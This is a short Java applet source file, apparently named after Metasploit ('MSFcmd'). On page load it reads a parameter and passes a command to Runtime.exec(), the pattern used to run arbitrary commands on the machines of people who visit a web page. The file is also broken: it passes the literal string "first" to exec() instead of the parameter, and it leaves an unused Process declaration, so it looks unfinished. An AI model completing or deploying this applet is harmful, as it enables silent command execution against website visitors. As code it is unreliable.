import java.applet.*;
import java.awt.*;
import java.io.*;
public class MSFcmd extends Applet {
    public void init() {
        Process f;
        String first = getParameter("first");
        try {
            f = Runtime.getRuntime().exec("first");
        }
        catch(IOException e) {
            e.printStackTrace();
        }
        Process s;
    }
}
